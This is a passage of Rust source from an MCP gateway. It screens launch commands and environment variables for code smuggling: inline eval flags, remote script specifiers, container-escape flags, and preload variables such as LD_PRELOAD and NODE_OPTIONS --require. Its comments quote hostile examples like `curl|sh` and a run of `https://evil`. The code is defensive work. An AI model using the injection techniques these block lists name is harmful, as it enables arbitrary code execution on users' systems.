fn deno_dangerous(args: &[String]) -> Option<&str> {
    const VALUE_OPTS: &[&str] = &[
        "--config", "-c", "--import-map", "--lock", "--cert", "--v8-flags", "--seed",
        "--log-level", "-L",
    ];
    let (sub, si) = next_operand(args, 0, VALUE_OPTS);
    let Some(sub) = sub else { return None };
    if sub.eq_ignore_ascii_case("eval") {
        return Some(sub);
    }
    if sub.eq_ignore_ascii_case("run") || sub.eq_ignore_ascii_case("serve") {
        if let (Some(target), _) = next_operand(args, si + 1, VALUE_OPTS) {
            if remote_specifier(target) {
                return Some(target);
            }
        }
    }
    None
}

/// Bun shares node's eval/preload flags, and additionally executes a remote specifier
/// via `bun run <remote>`. (`bun run <script>` / `bun x <pkg>` of a local/registry
/// package is the normal case, like npx, and stays allowed.)
fn bun_dangerous(args: &[String]) -> Option<&str> {
    if let Some(f) = node_dangerous(args) {
        return Some(f);
    }
    // Like deno: skip global value options and remote-check only the executable target, so
    // `bun --cwd x run https://evil` is caught while a URL passed as an app arg is ignored.
    const VALUE_OPTS: &[&str] = &["--cwd", "--config", "-c"];
    let (sub, si) = next_operand(args, 0, VALUE_OPTS);
    let Some(sub) = sub else { return None };
    let (target, _) = if sub.eq_ignore_ascii_case("run")
        || sub.eq_ignore_ascii_case("x")
        || sub.eq_ignore_ascii_case("exec")
    {
        next_operand(args, si + 1, VALUE_OPTS)
    } else {
        (Some(sub), si) // implicit run: the first operand is the target itself
    };
    if let Some(target) = target {
        if remote_specifier(target) {
            return Some(target);
        }
    }
    None
}

/// awk runs its program from a `-f file` OR inline as the first bare arg. An inline
/// program (`awk 'BEGIN{system(...)}'`) is arbitrary code with no file on disk, so an
/// awk invocation WITHOUT a `-f`/`--file` is refused; `awk -f script.awk` is allowed.
fn awk_dangerous(args: &[String]) -> Option<&str> {
    let has_file = args.iter().any(|a| {
        let al = a.to_ascii_lowercase();
        al == "-f" || al == "--file" || al.starts_with("--file=") || (al.starts_with("-f") && al.len() > 2)
    });
    if has_file {
        return None;
    }
    args.iter().find(|a| !a.starts_with('-')).map(|a| a.as_str())
}

/// Screen `env [VAR=val ...] <cmd> [args]`: peel the leading assignments (screened the
/// same way as the config's env field, so `env LD_PRELOAD=x node` is caught), then
/// screen the real inner command. `env` with its own flags (`-S`, `-u`, `-i`, ...) is
/// unusual and fragile to parse, so it fails closed.
fn screen_env_wrapper(args: &[String]) -> Result<(), String> {
    let mut assignments: Vec<(String, String)> = Vec::new();
    let mut i = 0;
    while let Some(a) = args.get(i) {
        if a.starts_with('-') {
            return Err(
                "refusing to launch 'env' with flags: set variables in the server's env \
                 field and name the program directly."
                    .to_string(),
            );
        }
        // A leading `KEY=VALUE` (key has no path separator) is an env assignment; the
        // first token that isn't one is the real command.
        match a.split_once('=') {
            Some((k, v)) if !k.is_empty() && !k.contains('/') && !k.contains('\\') => {
                assignments.push((k.to_string(), v.to_string()));
                i += 1;
            }
            _ => break,
        }
    }
    screen_spawn_env(&assignments)?;
    match args.get(i) {
        Some(cmd) => screen_spawn_command(cmd, &args[i + 1..]),
        None => Ok(()), // `env` with only assignments just sets vars; harmless.
    }
}

/// Screen the child's environment: even a benign command (`node server.js`) becomes
/// code execution if the config's env preloads code via the dynamic linker or an
/// interpreter's option/startup var. These have no legitimate use for a server
/// launcher, so refuse them (this is why we also refuse `env` as the command: the env
/// field is the ONLY way to set variables, and it's screened here).
pub fn screen_spawn_env(env: &[(String, String)]) -> Result<(), String> {
    // Always-refuse: dynamic-linker preload/audit + shell startup-file vars that run
    // code before (or instead of) the entry program. These have no benign value.
    const BLOCKED: &[&str] = &[
        "LD_PRELOAD", "LD_AUDIT", "DYLD_INSERT_LIBRARIES", "BASH_ENV", "ENV",
        // ZDOTDIR relocates zsh's startup dir, so `$ZDOTDIR/.zshenv` runs even for a
        // non-interactive `zsh script` (the zsh analog of the blocked BASH_ENV). GCONV_PATH
        // points iconv/gconv at an attacker-supplied conversion module. Neither has a
        // legitimate use on a server launcher.
        "ZDOTDIR", "GCONV_PATH",
    ];
    // Option vars that are usually benign (tuning) but can inject code via specific
    // options; only those options are refused (whole-var blocking false-positived on
    // benign values like RUBYOPT=-W0). Each entry: (VAR, dangerous option prefixes).
    // -r is ruby/node require; -e is omitted for RUBYOPT because it doesn't honor it and
    // would collide with the benign `-E<encoding>` after lowercasing.
    const OPTION_VARS: &[(&str, &[&str])] = &[
        ("NODE_OPTIONS", &["--require", "--import", "--loader", "--experimental-loader", "--eval", "-r"]),
        ("RUBYOPT", &["-r"]),
        ("JAVA_TOOL_OPTIONS", &["-javaagent", "-agentlib", "-agentpath"]),
        ("_JAVA_OPTIONS", &["-javaagent", "-agentlib", "-agentpath"]),
        // PERL5OPT applies to EVERY perl invocation (even `perl script.pl`): -M/-m
        // preload a module (running its code) and -d loads the debugger. Benign tuning
        // like -w stays allowed. Tokens are lowercased before compare, so -M -> -m.
        ("PERL5OPT", &["-m", "-d"]),
    ];
    for (k, v) in env {
        let ku = k.trim().to_ascii_uppercase();
        if BLOCKED.contains(&ku.as_str()) {
            return Err(format!(
                "refusing to launch: the environment variable '{k}' preloads or injects \
                 code into the process. Remove it from the server's env."
            ));
        }
        if let Some((_, bad)) = OPTION_VARS.iter().find(|(name, _)| *name == ku) {
            for tok in v.split_whitespace() {
                let tl = tok.to_ascii_lowercase();
                let head = tl.split('=').next().unwrap_or(&tl);
                // Prefix match so attached forms are caught in both `-r<mod>` and
                // `-javaagent:<jar>` (colon) shapes, not just an exact token.
                if bad.iter().any(|b| head == *b || head.starts_with(b)) {
                    return Err(format!(
                        "refusing to launch: {k} contains '{tok}', which preloads or \
                         evaluates code. Remove it from the server's env."
                    ));
                }
            }
        }
    }
    Ok(())
}

/// Lowercased final path segment without its extension, splitting on BOTH `/` and
/// `\` on every OS. `std::path` only treats `\` as a separator on Windows, so a
/// Windows-style path would slip this check on Linux/macOS; doing it by hand keeps
/// the guard (and its tests) platform-independent. `C:\\tools\\Node.EXE` and
/// `/usr/bin/node` both -> `node`.
fn command_basename(command: &str) -> String {
    let last = command.rsplit(['/', '\\']).next().unwrap_or(command);
    // Strip a trailing extension (`.exe`, `.js`, ...) but keep dotless names intact.
    let stem = last
        .rsplit_once('.')
        .map(|(s, _)| s)
        .filter(|s| !s.is_empty())
        .unwrap_or(last);
    stem.to_ascii_lowercase()
}

/// The first arg (returned verbatim for the error) that case-insensitively matches
/// one of `flags`, matching `-flag`, the `--flag=value` long form, AND the attached
/// short form the scripting interpreters accept where the value rides on the same
/// argv token (`python -c<code>`, `ruby -e<code>`, `perl -e<code>`, `php -r<code>`).
/// A plain equality check misses the attached form because the token is a single
/// unsplit string, letting inline eval smuggle straight past the guard — the same
/// hole `node_dangerous` already closes for `-r<module>`.
/// PowerShell runs arbitrary code via `-Command` and `-EncodedCommand` (base64), and
/// accepts any unambiguous abbreviation of a parameter name, so `-c`/`-co`/.../-command
/// and `-e`/`-en`/`-enc`/.../-encodedcommand (plus the documented `-ec` alias) all run
/// code while an exact-match list catches none of them. Match any switch whose name is
/// a prefix of `command` or `encodedcommand`; `-File`/`-NoProfile`/`-ExecutionPolicy`
/// and a bare script path stay allowed.
fn pwsh_dangerous(args: &[String]) -> Option<&str> {
    args.iter()
        .find(|a| {
            if !a.starts_with('-') && !a.starts_with('/') {
                return false;
            }
            let al = a.to_ascii_lowercase();
            let name = al.trim_start_matches(['-', '/']).split([':', '=']).next().unwrap_or("");
            !name.is_empty()
                && ("command".starts_with(name) || "encodedcommand".starts_with(name) || name == "ec")
        })
        .map(|a| a.as_str())
}

fn first_flag<'a>(args: &'a [String], flags: &[&str]) -> Option<&'a str> {
    args.iter().find(|a| {
        let al = a.to_ascii_lowercase();
        let head = al.split('=').next().unwrap_or(&al);
        if flags.contains(&head) {
            return true;
        }
        // Attached short form: `-c<code>` for a single-dash two-char flag like `-c`/`-e`.
        flags.iter().any(|f| {
            f.len() == 2 && f.starts_with('-') && al.len() > 2 && al.starts_with(f)
        })
    }).map(|a| a.as_str())
}

/// Interpreter FAMILY for dispatch: trims a trailing version so `python3.10`, `python3`,
/// and `python` all screen as `python`. Only a trailing run of ASCII digits and `.` is
/// trimmed, so non-versioned names are unchanged. Pairs with `command_basename`, which
/// already strips one extension (`python3.10.exe` -> `python3.10`).
fn interpreter_family(base: &str) -> &str {
    let trimmed = base.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    if trimmed.is_empty() {
        base
    } else {
        trimmed
    }
}

// Benign single-char short flags (case-sensitive) that take NO value, used by
// `clustered_eval` to know an eval flag packed AFTER them is a real inline-eval. Value-
// taking flags are deliberately OMITTED (python -m/-W/-X/-Q, ruby/perl -C/-F/-I/-K, shell
// -o) so a cluster that hands them the rest of the token isn't read as an eval.
const SHELL_BOOL: &[char] = &[
    'a', 'b', 'e', 'f', 'h', 'i', 'k', 'm', 'n', 'p', 'r', 's', 't', 'u', 'v', 'x', 'B',
    'C', 'E', 'H', 'P', 'T',
];
const PYTHON_BOOL: &[char] = &[
    'B', 'E', 'I', 'O', 'R', 'S', 'b', 'd', 'h', 'i', 'q', 's', 'u', 'v', 'x', '3',
];
const RUBY_BOOL: &[char] = &['a', 'c', 'd', 'h', 'l', 'n', 'p', 's', 'v', 'w', 'y'];
const PERL_BOOL: &[char] = &['U', 'W', 'X', 'T', 'a', 'c', 'h', 'l', 'n', 'p', 's', 'w'];

/// getopt short-flag clustering: `-ec` parses as `-e -c`, so an eval flag can ride behind
/// benign boolean flags (`sh -ec "curl|sh"`, `python -Ec "…"`, `ruby -we "…"`, `node -pe`)
/// that a plain `-c`/`-e` check misses. Walk a single-dash cluster: reaching an eval char
/// after a run of known boolean flags is a match; the first non-boolean (possibly value-
/// taking) char bails, so a value flag swallowing the rest of the token (`python -mHTTP`,
/// `bash -o pipefail`) is never mistaken for an eval. Case-sensitive so a value-taking
/// `-E`/`-W`/`-C` isn't read as a lowercase eval. `-c`/`-e` alone and `--long` forms are
/// already handled by `first_flag`.
fn clustered_eval<'a>(args: &'a [String], eval: &[char], boolean: &[char]) -> Option<&'a str> {
    for a in args {
        let s = a.as_str();
        // `--` ends the interpreter's own options; tokens after it are the script and its
        // arguments, not interpreter flags, so a cluster-shaped app arg past `--` is not a
        // real eval. (Bare operands without `--` are still scanned, matching first_flag's
        // long-standing behavior; stopping there safely would need per-interpreter value-
        // option tables, and a naive stop reintroduces bypasses via `-W x -Ec` / `-o v -ec`.)
        if s == "--" {
            break;
        }
        if !s.starts_with('-') || s.starts_with("--") || s.len() <= 2 {
            continue;
        }
        for c in s[1..].chars() {
            if eval.contains(&c) {
                return Some(s);
            }
            if !boolean.contains(&c) {
                break;
            }
        }
    }
    None
}

/// Docker/Podman args that ESCALATE beyond what a normal host process already has:
/// privileged mode, added capabilities, device passthrough, and host-namespace
/// sharing. Plain host mounts (`-v` / `--volume` / `--mount`) are intentionally NOT
/// blocked: Toolport already runs npx/uvx/binary servers with full host-filesystem
/// access, so a docker volume mount is no more dangerous than the servers we run
/// unrestricted, and blocking it would false-positive on legitimate dockerized MCP
/// servers. Namespace flags (`--pid`, `--net`, ...) trip only when their value is
/// `host`, in either `--pid=host` or `--pid host` form (so `--network mynet` is fine).
fn container_escape_flag(args: &[String]) -> Option<&str> {
    for (i, a) in args.iter().enumerate() {
        let al = a.to_ascii_lowercase();
        let head = al.split('=').next().unwrap_or(&al);
        if matches!(head, "--privileged" | "--cap-add" | "--device") {
            return Some(a.as_str());
        }
        if matches!(head, "--pid" | "--ipc" | "--uts" | "--net" | "--network" | "--userns") {
            let val = al
                .split_once('=')
                .map(|(_, v)| v.to_string())
                .or_else(|| args.get(i + 1).map(|v| v.to_ascii_lowercase()));
            if val.as_deref() == Some("host") {
                return Some(a.as_str());
            }
        }
    }
    None
}

/// Talks to a downstream MCP server over its stdio (a spawned child process).
/// Stdout is drained on a background thread into a channel so reads can time out
/// (a blocking `read_line` on an unresponsive child would otherwise hang forever).
pub struct StdioTransport {
    child: Child,
    /// Windows Job Object that owns the complete launcher process tree. Closing
    /// it terminates descendants that outlive an `npx`/`uvx` wrapper.
    #[cfg(windows)]
    job: Option<WindowsJob>,
    stdin: Arc<Mutex<ChildStdin>>,
    rx: Receiver<String>,
    /// Tail of the child's stderr, drained on a background thread. A server that
    /// dies on startup (bad package name, missing API key) explains itself here,
    /// so we can report that instead of a bare "closed the connection".
    stderr: Arc<Mutex<String>>,
    next_id: i64,
    /// How long a single request waits for its response. Lowered during the
    /// connect handshake, then restored for (potentially slow) live tool calls.
    read_timeout: Duration,
    /// Gate shared with the stdout drain: the drain only flags a `dirty` signal
    /// once this is set, so tool-list changes announced during startup are
    /// ignored. Flipped on by `arm_tools_watch` after the handshake.
    armed: Arc<AtomicBool>,
    /// The command is a download-then-run launcher (npx, uvx, ...): its first
    /// `initialize` gets the long connect budget, and a connect timeout is
    /// reported as "still installing" rather than a dead server.
    launcher: bool,
    /// Answers server-initiated JSON-RPC (e.g. `roots/list`) by forwarding to the
    /// upstream MCP client. Set by the gateway before the connect handshake.
    server_handler: Option<ServerRequestHandler>,
    /// A legacy server request suspended between two modern upstream round trips.
    /// The child keeps processing the original request; the retry only supplies
    /// the requested input and must not start a second downstream call.
    pending_mrtr: Option<PendingLegacyMrtr>,
    /// Routes `notifications/progress` back to the client that minted the token
    /// (SOU-444). Shared with the stdout drain thread so the gateway can bind it
    /// after the transport is spawned, keeping `spawn_watched`'s signature stable.
    progress: Arc<Mutex<Option<ProgressSink>>>,
    /// Standard per-request `_meta` for a modern (2026-07-28+) connection, merged
    /// into every outgoing request. `None` on legacy connections (SOU-445).
    protocol_meta: Option<Value>,
    /// Request id of the current long-lived `subscriptions/listen` request.
    subscription_listener_id: Option<i64>,
}

/// Owns a Windows Job Object configured to terminate every assigned process
/// when the handle closes. Handles are stored as an integer so this RAII owner
/// remains `Send`, matching [`Transport`], while still owning exactly one native
/// handle.
#[cfg(windows)]
struct WindowsJob {
    handle: usize,
}

#[cfg(windows)]
impl WindowsJob {
    /// Creates a Job Object that terminates all assigned processes when closed.
    fn new() -> Result<Self, String> {
        use std::mem::{size_of, zeroed};
        use std::ptr;
        use windows_sys::Win32::System::JobObjects::{
            CreateJobObjectW, JobObjectExtendedLimitInformation, SetInformationJobObject,
            JOBOBJECT_EXTENDED_LIMIT_INFORMATION, JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE,
        };

        // SAFETY: null security/name pointers request a private, non-inheritable
        // Job Object. `info` has the exact layout and byte size required by the
        // selected information class.
        unsafe {
            let handle = CreateJobObjectW(ptr::null(), ptr::null());
            if handle.is_null() {
                return Err(format!(
                    "failed to create Windows process Job Object: {}",
                    std::io::Error::last_os_error()
                ));
            }

            let mut info: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = zeroed();
            info.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
            if SetInformationJobObject(
                handle,
                JobObjectExtendedLimitInformation,
                &info as *const _ as *const std::ffi::c_void,
                size_of::<JOBOBJECT_EXTENDED_LIMIT_INFORMATION>() as u32,
            ) == 0
            {
                let error = std::io::Error::last_os_error();
                let _ = windows_sys::Win32::Foundation::CloseHandle(handle);
                return Err(format!(
                    "failed to configure Windows process Job Object: {error}"
                ));
            }

            Ok(Self {
                handle: handle as usize,
            })
        }
    }

    /// Assigns a suspended child process to this Job Object.
    fn assign(&self, child: &Child) -> Result<(), String> {
        use std::os::windows::io::AsRawHandle;
        use windows_sys::Win32::System::JobObjects::AssignProcessToJobObject;

        // SAFETY: both handles remain valid for the duration of the call. The
        // Child owns its process handle and this value owns the Job Object.
        let assigned = unsafe {
            AssignProcessToJobObject(
                self.handle as windows_sys::Win32::Foundation::HANDLE,
                child.as_raw_handle() as windows_sys::Win32::Foundation::HANDLE,
            )
        };
        if assigned == 0 {
            return Err(format!(
                "failed to attach downstream process to Windows Job Object: {}",
                std::io::Error::last_os_error()
            ));
        }
        Ok(())
    }

    /// Resumes the primary thread of a child created with `CREATE_SUSPENDED`.
    fn resume(child: &Child) -> Result<(), String> {
        use std::mem::size_of;
        use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
        use windows_sys::Win32::System::Diagnostics::ToolHelp::{
            CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32,
            TH32CS_SNAPTHREAD,
        };
        use windows_sys::Win32::System::Threading::{
            OpenThread, ResumeThread, THREAD_SUSPEND_RESUME,
        };

        // SAFETY: the snapshot and thread handles are checked before use and
        // closed on every path. A CREATE_SUSPENDED process has a primary thread
        // before any of its code can execute.
        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if snapshot == INVALID_HANDLE_VALUE {
                return Err(format!(
                    "failed to enumerate suspended downstream process threads: {}",
                    std::io::Error::last_os_error()
                ));
            }

            let mut entry = THREADENTRY32 {
                dwSize: size_of::<THREADENTRY32>() as u32,
                ..Default::default()
            };
            let mut has_entry = Thread32First(snapshot, &mut entry);
            while has_entry != 0 {
                if entry.th32OwnerProcessID == child.id() {
                    let thread = OpenThread(THREAD_SUSPEND_RESUME, 0, entry.th32ThreadID);
                    if thread.is_null() {
                        let error = std::io::Error::last_os_error();
                        let _ = CloseHandle(snapshot);
                        return Err(format!(
                            "failed to open suspended downstream process thread: {error}"
                        ));
                    }

                    let resume_result = ResumeThread(thread);
                    let resume_error = (resume_result == u32::MAX)
                        .then(std::io::Error::last_os_error);
                    let _ = CloseHandle(thread);
                    let _ = CloseHandle(snapshot);
                    if let Some(error) = resume_error {
                        return Err(format!(
                            "failed to resume downstream process after Job Object assignment: {error}"
                        ));
                    }
                    return Ok(());
                }
                has_entry = Thread32Next(snapshot, &mut entry);
            }

            let _ = CloseHandle(snapshot);
        }

        Err("failed to find suspended downstream process thread".to_string())
    }
}

#[cfg(windows)]
impl Drop for WindowsJob {
    fn drop(&mut self) {
        use windows_sys::Win32::Foundation::CloseHandle;
        use windows_sys::Win32::System::JobObjects::TerminateJobObject;

        if self.handle == 0 {
            return;
        }
        let handle = self.handle as windows_sys::Win32::Foundation::HANDLE;
        // SAFETY: this object exclusively owns `handle`. Explicit termination
        // makes normal teardown immediate; KILL_ON_JOB_CLOSE is the crash-safe
        // backstop when Rust destructors cannot run.
        unsafe {
            let _ = TerminateJobObject(handle, 1);
            let _ = CloseHandle(handle);
        }
        self.handle = 0;
    }
}

/// Tolerate a config that packed the whole invocation into `command` (e.g.
/// `"npx -y @scope/pkg"`) with empty `args`. Left as-is, the OS is asked to spawn an
/// executable literally named that whole string and fails with a cryptic "cannot find
/// the path specified". Only splits when args are empty AND the first token is a bare
/// program name (no `/` or `\`), so a genuine executable path — even one with spaces —
/// and any config that already passes args separately are left untouched. The split
/// output is what gets screened and spawned, so the real inner program is still guarded.
pub fn normalize_invocation(command: &str, args: &[String]) -> (String, Vec<String>) {
    if args.is_empty() {
        let mut parts = command.split_whitespace();
        let first = parts.next().unwrap_or("");
        let rest: Vec<String> = parts.map(String::from).collect();
        if !rest.is_empty() && !first.contains('/') && !first.contains('\\') {
            return (first.to_string(), rest);
        }
    }
    (command.to_string(), args.to_vec())
}

/// True when the invocation is a download-then-run launcher: the command may have
/// to resolve and download the actual server package before it can respond (npx /
/// bunx from the npm registry, uvx / pipx from PyPI, and the package managers'
/// dlx/exec forms). Matches the executable's basename so absolute paths and
/// Windows shims (`npx.cmd`, `npx.exe`) count too.
pub fn is_download_launcher(command: &str, args: &[String]) -> bool {
    let (command, args) = normalize_invocation(command, args);
    // Split on both separators so Windows paths (e.g. `C:\...\npx.cmd`) match on
    // Linux CI and when configs store absolute shim paths cross-platform.
    let base = command
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(&command)
        .to_ascii_lowercase();
    let base = base
        .strip_suffix(".exe")
        .or_else(|| base.strip_suffix(".cmd"))
        .or_else(|| base.strip_suffix(".ps1"))
        .unwrap_or(&base);
    let first = args.first().map(String::as_str);
    match base {
        "npx" | "uvx" | "bunx" => true,
        // These only download via their run-a-package subcommand; `pnpm start`
        // and friends run what's already there.
        "pnpm" | "yarn" => first == Some("dlx"),
        "npm" => matches!(first, Some("exec") | Some("x")),
        "pipx" => first == Some("run"),
        _ => false,
    }
}

/// The connect-handshake read timeout policy for a stdio invocation: launchers
/// that may be downloading their package on first run get the long budget,
/// everything else the tight one (so a hung server still fails fast).
pub fn stdio_connect_timeout(command: &str, args: &[String]) -> Duration {
    if is_download_launcher(command, args) {
        LAUNCHER_CONNECT_TIMEOUT
    } else {
        STDIO_CONNECT_TIMEOUT
    }
}

/// Strip the gateway's own control-plane environment from a spawned downstream
/// server. A downstream MCP server is untrusted code, and a compromised package
/// can read its own process environment; in the file-backend and `--http`
/// bridge deployments that inherited env carries the vault master key
/// (`TOOLPORT_SECRET_KEY` / legacy `CONDUIT_SECRET_KEY`) or the local tool-bridge
/// token (`TOOLPORT_HTTP_TOKEN` / legacy `CONDUIT_HTTP_TOKEN`). Neither is meant
/// for a downstream server, so remove the whole inherited `TOOLPORT_*` and
/// `CONDUIT_*` namespaces (covers both, plus any future control var). A var the
/// server set for itself via its own `env` is exempt and left untouched.
/// Put each spawned downstream server in its own process group so terminal
/// job-control signals (SIGTTIN/SIGTTOU) generated by or directed at a child
/// cannot propagate to the gateway's process group (and through it, to the AI
/// client that spawned the gateway). No-op on Windows (no process-group analog).
fn apply_process_group_isolation(cmd: &mut Command) {
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        // process_group(0) creates a new pg with id = child's pid. Stable since
        // Rust 1.64; no external dependency.
        cmd.process_group(0);
    }
    #[cfg(not(unix))]
    {
        // Windows: CREATE_NEW_PROCESS_GROUP is handled at the call site via
        // creation_flags; nothing to do here.
        let _ = cmd;
    }
}

fn strip_gateway_control_env(cmd: &mut Command, configured: &std::collections::HashSet<&str>) {
    for (key, _) in std::env::vars_os() {
        let Some(k) = key.to_str() else { continue };
        let is_control =
            k.starts_with("TOOLPORT_") || k.starts_with("CONDUIT_");
        if is_control && !configured.contains(k) {
            cmd.env_remove(&key);
        }
    }
}

impl StdioTransport {
    /// Spawn a downstream server without watching for its tool-list changes.
    /// Used by one-shot callers (the app's health probe and playground) that
    /// don't keep the connection around to react to live notifications.
    pub fn spawn(
        command: &str,
        args: &[String],
        env: &[(String, String)],
        cwd: Option<&str>,
    ) -> Result<Self, String> {
        Self::spawn_inner(command, args, env, cwd, None, None)
    }

    /// Like [`spawn`], but sets a [`change`] bit in `dirty` whenever the downstream
    /// server emits a `tools` / `resources` / `prompts` `list_changed` notification
    /// (after `arm_tools_watch`). The gateway watches that flag and re-queries the
    /// affected list, so a server changing its own catalog mid-session reaches the
    /// client instead of being silently dropped.
    ///
    /// When `resource_updated` is set, armed `notifications/resources/updated`
    /// lines invoke that sink with the resource URI (SOU-394) so the gateway can
    /// fan out only to subscribed upstream clients.
    pub fn spawn_watched(
        command: &str,
        args: &[String],
        env: &[(String, String)],
        cwd: Option<&str>,
        dirty: Arc<AtomicU8>,
        resource_updated: Option<ResourceUpdatedSink>,
    ) -> Result<Self, String> {
        Self::spawn_inner(command, args, env, cwd, Some(dirty), resource_updated)
    }

    fn spawn_inner(
        command: &str,
        args: &[String],
        env: &[(String, String)],
        cwd: Option<&str>,
        dirty: Option<Arc<AtomicU8>>,
        resource_updated: Option<ResourceUpdatedSink>,
    ) -> Result<Self, String> {
        // Split a command that packed its args into the `command` string, so a
        // mis-shaped config spawns correctly instead of erroring cryptically.
        let (command_owned, args_owned) = normalize_invocation(command, args);
        let command = command_owned.as_str();
        let args = args_owned.as_slice();
        // Supply-chain guard: refuse code-smuggling / container-escape args AND
        // code-injecting env vars before we hand the command to the OS. Applies to
        // every spawn path (probe, playground, gateway) so a booby-trapped config
        // never reaches a process.
        screen_spawn_command(command, args)?;
        screen_spawn_env(env)?;
        // Collapse an `npx`/`.cmd`-shim chain to the `node <entry>` it would have
        // ended at. On Windows that is 4 processes down to 1 per server; the shims
        // do no work beyond holding pipes open. Anything not provably equivalent
        // resolves to None and spawns unchanged. Re-screen the rewrite: the guard
        // must judge what actually runs, not only what was configured, and a refusal
        // falls back to the original rather than failing the spawn.
        //
        // Classify the CONFIGURED invocation before the rewrite shadows it. The
        // `launcher` field decides the connect budget (120s vs 10s), and
        // `stdio_connect_timeout` computes that from the original command at other
        // call sites; reading it off the rewritten pair would say `node`, i.e. not a
        // launcher, and quietly cut a slow-starting server's handshake budget to a
        // tenth for the ones the rewrite happened to succeed on.
        let launcher = is_download_launcher(command, args);
        let direct = crate::launcher::resolve_direct(command, args)
            .filter(|d| screen_spawn_command(&d.command, &d.args).is_ok());
        // Bind the rewrite to NEW names rather than shadowing `command`/`args`.
        // Shadowing left every later read silently referring to `node <abs script>`,
        // which is right for the spawn and wrong for everything that describes the
        // server: the connect-budget classification below, and the spawn error
        // message. Keeping both pairs addressable makes each read state which one it
        // means instead of depending on where it sits in the function.
        let (spawn_command, spawn_args) = match &direct {
            Some(d) => (d.command.as_str(), d.args.as_slice()),
            None => (command, args),
        };
        let resolved = resolve_command(spawn_command);
        let mut cmd = Command::new(&resolved);
        cmd.args(spawn_args)
            .envs(env.iter().cloned())
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        // Never hand the gateway's own control-plane env (vault master key /
        // HTTP-bridge token) to an untrusted downstream server. Anything the server
        // configured for itself in `env` is exempt. See strip_gateway_control_env.
        let configured: std::collections::HashSet<&str> =
            env.iter().map(|(k, _)| k.as_str()).collect();
        strip_gateway_control_env(&mut cmd, &configured);
        // Optional per-server working directory (issue #239). Unset (or blank)
        // means inherit the gateway's cwd, the previous behavior. `~` and `${VAR}`
        // are expanded so a config can pin a server to a project dir. Validate the
        // expansion first so a missing dir reports the configured and expanded paths.
        if let Some(dir) = cwd.map(str::trim).filter(|d| !d.is_empty()) {
            cmd.current_dir(validate_cwd(dir)?);
        }
        // Give the child the augmented PATH too, so e.g. `npx` can find `node`.
        #[cfg(not(windows))]
        cmd.env("PATH", augmented_path());
        // Replacing the launcher means also replacing the PATH it set up: the
        // package's own `node_modules/.bin`. Servers that shell out to a sibling
        // binary would otherwise stop finding it. Prepend to whatever PATH the child
        // would have received anyway, so a rewrite only ever ADDS an entry and never
        // changes which PATH wins.
        if let Some(dir) = direct.as_ref().and_then(|d| d.bin_dir.as_ref()) {
            let base = base_child_path(env);
            let mut merged = dir.to_string_lossy().into_owned();
            if !base.is_empty() {
                merged.push(if cfg!(windows) { ';' } else { ':' });
                merged.push_str(&base);
            }
            cmd.env("PATH", merged);
        }
        // Isolate each downstream server in its own process group so terminal
        // job-control signals (SIGTTIN/SIGTTOU) generated during the child's
        // startup or runtime cannot propagate to the gateway's own process
        // group (and through it, to the AI client that spawned the gateway).
        // Without this, a child that touches the inherited TTY can disrupt the
        // raw-mode terminal I/O of the parent client.
        apply_process_group_isolation(&mut cmd);
        // CREATE_NO_WINDOW: without it, every stdio server we spawn flashes a
        // console window on Windows (very visible during a probe/refresh, which
        // spawns one per server). The app and the gateway both spawn through here.
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            use windows_sys::Win32::System::Threading::{CREATE_NO_WINDOW, CREATE_SUSPENDED};
            cmd.creation_flags(CREATE_NO_WINDOW | CREATE_SUSPENDED);
        }
        #[cfg(windows)]
        let job = WindowsJob::new()?;
        let mut child = cmd
            .spawn()
            .map_err(|e| format!("failed to spawn '{command}': {e}"))?;
        #[cfg(windows)]
        if let Err(error) = job.assign(&child).and_then(|_| WindowsJob::resume(&child)) {
            let _ = child.kill();
            let _ = child.wait();
            return Err(error);
        }
        let stdin = Arc::new(Mutex::new(child.stdin.take().ok_or("no child stdin")?));
        let stdout = child.stdout.take().ok_or("no child stdout")?;
        let stderr = child.stderr.take().ok_or("no child stderr")?;

        // Drain stdout line-by-line on a dedicated thread; the request loop pulls
        // from the channel with a timeout. The thread ends on EOF/read error or
        // when the receiver is dropped (transport closed). `forward_line` also
        // flags `dirty` when an armed server announces a tool-list change.
        let (tx, rx) = std::sync::mpsc::channel();
        let armed = Arc::new(AtomicBool::new(false));
        let drain_armed = Arc::clone(&armed);
        let progress: Arc<Mutex<Option<ProgressSink>>> = Arc::new(Mutex::new(None));
        let drain_progress = Arc::clone(&progress);
        std::thread::spawn(move || {
            let mut reader = BufReader::new(stdout);
            loop {
                let mut line = String::new();
                // Bound each line to the same cap as an HTTP response body: a broken or
                // hostile server that emits one newline-less multi-gigabyte line can't
                // grow this String without limit (a plain `read_line` would). `take`
                // stops at the cap; a full-cap line with no terminator is a protocol
                // violation, so we close the connection.
                match (&mut reader).take(MAX_RESPONSE_BYTES).read_line(&mut line) {
                    Ok(0) => break,
                    Ok(n) => {
                        if n as u64 >= MAX_RESPONSE_BYTES && !line.ends_with('\n') {
                            eprintln!(
                                "toolport: downstream emitted an unterminated line >= {MAX_RESPONSE_BYTES} bytes; closing connection"
                            );
                            break;
                        }
                        if !forward_line(
                            line,
                            &tx,
                            &dirty,
                            &drain_armed,
                            &resource_updated,
                            &drain_progress,
                        ) {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        // Drain stderr into a shared buffer, capped so a chatty server can't grow
        // it without bound. We keep the most recent output (where the fatal error
        // usually is).
        let stderr_buf = Arc::new(Mutex::new(String::new()));
        let stderr_writer = Arc::clone(&stderr_buf);
        std::thread::spawn(move || {
            let mut reader = BufReader::new(stderr);
            let mut line = String::new();
            while let Ok(n) = reader.read_line(&mut line) {
                if n == 0 {
                    break;
                }
                if let Ok(mut buf) = stderr_writer.lock() {
                    buf.push_str(&line);
                    if buf.len() > STDERR_TAIL_CAP {
                        let cut = buf.len() - STDERR_TAIL_CAP;
                        buf.drain(..cut);
                    }
